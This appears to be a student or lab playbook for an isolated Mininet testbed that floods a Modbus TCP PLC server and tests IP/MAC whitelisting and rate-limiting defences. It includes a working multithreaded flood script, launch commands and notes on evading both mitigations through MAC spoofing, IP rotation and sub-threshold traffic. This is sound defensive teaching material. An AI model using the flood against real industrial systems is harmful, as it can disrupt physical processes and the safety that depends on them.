# Scenario 3 Playbook: Denial of Service via Request Flooding

**Tactic:** Denial of Service
**Owner:** Daniel Sleiman (attack), Johnson Huynh (IP/MAC whitelist mitigation), Moufid Sleiman (rate-limiting mitigation)
**Executed:** Autumn 2026
**Platform:** Ubuntu 24.04 LTS, Mininet 2.3, pymodbus 3.12.1

---

## Protocol behaviour

Modbus TCP was designed with no mechanism to limit, authenticate or prioritise incoming
requests. Any TCP client that can reach the server port can send requests as fast as its
CPU allows, and the server will attempt to process every one of them. This makes Modbus
TCP servers inherently vulnerable to request flooding: a sufficient volume of concurrent
connections saturates the server's thread pool and CPU, causing legitimate clients to
experience severe degradation or complete loss of service.

The attack requires no credentials, no special tools and no prior knowledge beyond the
server IP and port. The flood script opens a persistent TCP connection and immediately
begins issuing FC03 Read Holding Registers requests in a tight loop, reconnecting
instantly on any error.

---

## MITRE ATT&CK for ICS mapping

| Tactic | Technique | ID |
|---|---|---|
| Denial of Service | Denial of Service | T0814 |
| Discovery | Remote System Discovery | T0846 |
| Discovery | Remote System Information Discovery | T0888 |
| Collection | Monitor Process State | T0801 |

---

## Testbed topology

| Host | IP | Role |
|---|---|---|
| plc1 (PLC-PUMP1) | 10.0.0.2 | Modbus TCP server (victim) |
| scada01 (SCADA-01) | 10.0.1.1 | Legitimate polling client |
| ews01 (EWS-01) | 10.0.0.1 | Attacker 1 |
| ews02 (EWS-02) | 10.0.0.3 | Attacker 2 |
| ews03 (EWS-03) | 10.0.0.4 | Attacker 3 |

---

## Running the base attack (no mitigation)

### Step 1: Start the topology

```bash
sudo mn -c
sudo python3 topology/mininet_topo.py
```

### Step 2: Start the Modbus server on plc1

```
mininet> plc1 python3 servers/scenario3_server.py &
```

Wait for:
```
OT Testbed - Scenario 3 Modbus server (PLC-PUMP1)
Listening on 10.0.0.2:5502 -- no mitigations active
```

### Step 3: Start the legitimate client on scada01

```
mininet> scada01 python3 clients/scenario3_client.py &
```

Confirm healthy baseline responses printing every second:
```
[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 0.001s
```

### Step 4: Launch the flood from all three attackers

```
mininet> ews01 python3 attacks/scenario3_flood.py &
mininet> ews02 python3 attacks/scenario3_flood.py &
mininet> ews03 python3 attacks/scenario3_flood.py
```

Each attacker launches 300 threads. Each thread opens a persistent TCP connection and
issues FC03 reads of 150 holding registers in a tight loop, reconnecting immediately on
any error. The flood script is intentionally minimal:

```python
def flood():
    while True:
        try:
            client = ModbusTcpClient(TARGET, port=PORT, timeout=0.1)
            client.connect()
            while True:
                client.read_holding_registers(30000, 150, device_id=1)
        except:
            pass
```

The `except: pass` block silently swallows all errors and reconnects, meaning the flood
continues regardless of whether the server is rejecting connections or timing out.

### Step 5: Observe the impact on scada01

Response times should degrade significantly within a few seconds:
```
[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 2.341s
[HH:MM:SS] EXCEPTION: Failed to connect | Time: 1.002s
[HH:MM:SS] EXCEPTION: Failed to connect | Time: 1.002s
```

### Step 6: Stop the flood

Press `Enter` in the flood terminal windows. scada01 should recover to ~0.001s
response times immediately, confirming the degradation was caused purely by server load
and not any lasting damage.

### Expected results

| Phase | scada01 response time | Status |
|---|---|---|
| No attack | ~0.001s | Normal |
| 300 threads flooding | 2-3 seconds | Degraded |
| All three attackers flooding | Timeouts and failures | Severe DoS |
| Attack stopped | ~0.001s | Recovered |

---

## Mitigation 1: IP and MAC address whitelisting

**Owner:** Johnson Huynh
**File:** `mitigations/scenario3_serverwhite.py`

### How it works

The whitelisted server applies iptables rules at startup before the Modbus listener
binds. Only the whitelisted IP and MAC address pair is permitted to reach port 5502.
All other connections are silently dropped at the kernel level before any data reaches
the pymodbus process.

The key iptables rules applied:
```bash
# Allow only the whitelisted IP + MAC pair
iptables -A INPUT -p tcp --dport 5502 -s 10.0.1.1 -m mac --mac-source <MAC> -j ACCEPT

# Drop everything else
iptables -A INPUT -p tcp --dport 5502 -j DROP
```

The `-m mac --mac-source` module checks both the IP address and the hardware MAC
address simultaneously. An attacker who spoofs the whitelisted IP is still blocked if
their MAC does not match.

The ARP cache is pre-populated with a ping before the MAC lookup so the `arp -n`
command can resolve the address:

```python
def populate_arp_cache():
    for ip in ALLOWED_IPS:
        os.system(f'ping -c 2 {ip} > /dev/null 2>&1')
        mac = get_mac_from_arp(ip)
```

### Important: MAC addresses change on every Mininet restart

Mininet randomly assigns MAC addresses each time the topology starts. Before running
`scenario3_serverwhite.py`, the MAC address in the file must be updated manually.

#### Step 1: Start the topology and find scada01's current MAC

```bash
sudo mn -c
sudo python3 topology/mininet_topo.py
```

In the Mininet CLI:
```
mininet> scada01 ip link show scada01-eth0
```

Look for the `link/ether` line:
```
link/ether aa:bb:cc:dd:ee:ff brd ff:ff:ff:ff:ff:ff
```

#### Step 2: Update the MAC in the mitigation file

Open `mitigations/scenario3_serverwhite.py` and update:
```python
ALLOWED_IPS  = ['10.0.1.1']
ALLOWED_MACS = {
    '10.0.1.1': 'aa:bb:cc:dd:ee:ff'   # replace with MAC from Step 1
}
```

#### Step 3: Run the whitelisted server

```
mininet> plc1 python3 mitigations/scenario3_serverwhite.py &
```

Expected output:
```
Populating ARP cache...
  [ARP LEARNED] 10.0.1.1 -> aa:bb:cc:dd:ee:ff
Applying IP + MAC whitelist via iptables...
  [ALLOWED] 10.0.1.1 with MAC aa:bb:cc:dd:ee:ff
  [BLOCKED] all other IPs and MACs -> port 5502
Whitelist applied
```

#### Step 4: Start the client and flood as before

```
mininet> scada01 python3 clients/scenario3_client.py &
mininet> ews01 python3 attacks/scenario3_flood.py &
mininet> ews02 python3 attacks/scenario3_flood.py &
mininet> ews03 python3 attacks/scenario3_flood.py
```

scada01 should maintain normal response times throughout the flood:
```
[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 0.001s
[HH:MM:SS] OK pump1-flow=300 pump2-flow=185 | Time: 0.001s
```

### Results

| Metric | Without mitigation | With whitelist active |
|---|---|---|
| scada01 response time | 2-3 seconds | ~0.001s unchanged |
| scada01 failure rate | High, timeouts and errors | 0%, no failures |
| Attacker connections reaching plc1 | All processed | All silently dropped |
| plc1 server load during flood | Overwhelmed | No impact |

### Limitations

- MAC addresses must be updated manually every Mininet session
- An attacker with knowledge of the whitelisted MAC can spoof it using `ip link set dev eth0 address`
- The `-m mac` iptables module only works on the same network segment; it cannot verify MACs across routed boundaries
- A compromised device that already holds the correct IP and MAC passes the check regardless

### Cleanup

```
mininet> plc1 iptables -F INPUT
```

---

## Mitigation 2: Per-IP connection rate limiting

**Owner:** Moufid Sleiman (Daniel Sleiman)
**File:** `mitigations/scenario3_ratelimit.py`

### How it works

The rate-limiting mitigation runs a TCP proxy on port 5502 that intercepts every
incoming connection before it reaches the Modbus server. The internal Modbus server
binds on port 5020 instead and is never directly exposed.

For each incoming connection, the proxy checks how many connections that IP address has
opened in the last one second using a sliding time window:

```python
def _rate_check(ip: str) -> bool:
    now    = time.time()
    window = _windows[ip]

    while window and now - window[0] > 1.0:
        window.popleft()

    if len(window) >= MAX_CONN_PER_SECOND:
        return False       # rate limit exceeded -- drop the connection

    window.append(now)
    return True            # within limit -- forward to Modbus server
```

`MAX_CONN_PER_SECOND` is set to 2. Any IP that exceeds 2 new connections per second
has its connection dropped immediately with no response. Legitimate SCADA polling at
one request per second comfortably stays within the limit. The flood script opening
300 persistent connections trips the limit on the first burst.

Connections that pass the rate check are forwarded transparently to the internal Modbus
server through a bidirectional pipe:

```python
t1 = threading.Thread(target=_pipe, args=(client_sock, upstream), daemon=True)
t2 = threading.Thread(target=_pipe, args=(upstream, client_sock), daemon=True)
t1.start(); t2.start()
t1.join();  t2.join()
```

The proxy logs every dropped connection with the offending IP and a stats summary every
10 seconds.

### Running the rate-limiting mitigation

#### Step 1: Start the topology

```bash
sudo mn -c
sudo python3 topology/mininet_topo.py
```

#### Step 2: Start the rate-limited server on plc1

```
mininet> plc1 python3 mitigations/scenario3_ratelimit.py &
```

Expected output:
```
[INFO] Internal Modbus server on 10.0.0.2:5020
[INFO] Rate-limiting proxy on 10.0.0.2:5502  (limit: 2 conn/s per IP)
```

#### Step 3: Start the legitimate client and flood

```
mininet> scada01 python3 clients/scenario3_client.py &
mininet> ews01 python3 attacks/scenario3_flood.py &
mininet> ews02 python3 attacks/scenario3_flood.py &
mininet> ews03 python3 attacks/scenario3_flood.py
```

#### Step 4: Observe the proxy output on plc1

```
[HH:MM:SS] RATE-LIMITED  10.0.0.1  (>2 conn/s) -- connection dropped
[HH:MM:SS] RATE-LIMITED  10.0.0.3  (>2 conn/s) -- connection dropped
[HH:MM:SS] RATE-LIMITED  10.0.0.4  (>2 conn/s) -- connection dropped

─────────────────────────────────────────────
  STATS @ HH:MM:SS
  Allowed : 12
  Dropped : 847  (98.6% drop rate)
  Total   : 859
  Top IPs (conn/s window):
    10.0.0.1          2 in last 1s
    10.0.0.3          2 in last 1s
    10.0.0.4          2 in last 1s
─────────────────────────────────────────────
```

scada01 (10.0.1.1) stays within the 2 conn/s limit and continues polling normally.

### Results

| Metric | Without mitigation | With rate-limiting active |
|---|---|---|
| scada01 response time | 2-3 seconds | 0.01-0.06s |
| scada01 failure rate | 100%, timeouts and errors | 0%, no failures |
| Attacker connections reaching plc1 | All processed | All dropped at proxy |
| plc1 server load during flood | Overwhelmed | No impact |

### Limitations

- Reactive, not proactive: the limit allows up to `MAX_CONN_PER_SECOND` connections from each attacker before dropping them, meaning some flood traffic still reaches the proxy
- An attacker who identifies the threshold can send requests just under the limit and slow-burn the server
- Running the proxy alongside the Modbus server consumes additional CPU and memory, which may affect constrained OT hardware
- An attacker who rotates IP addresses can partially bypass per-IP limits

---

## Cleanup

```
mininet> exit
sudo mn -c
```

---

## Key differences between the two mitigations

| Property | IP + MAC whitelist | Rate limiting |
|---|---|---|
| Works against internal attackers | Only if they are not whitelisted | Yes, applies to all IPs equally |
| Requires attacker identification | Yes, must know attacker IP/MAC | No, blanket per-IP policy |
| Requires configuration per session | Yes, MAC must be updated each restart | No, threshold is static |
| Stops flood entirely | Yes, all attacker traffic dropped | Mostly, up to threshold still passes |
| Works across routed boundaries | No, MAC check is L2 only | Yes, proxy works at TCP layer |

---

## References

- MITRE ATT&CK for ICS: https://attack.mitre.org/techniques/ics/
- Karapetcoff, C. (2021). What are Denial-Of-Service (DoS) Attacks? Computing Australia Group.
- Veridify Security. (2023). Modbus Security Issues and How to Mitigate Cyber Risks.
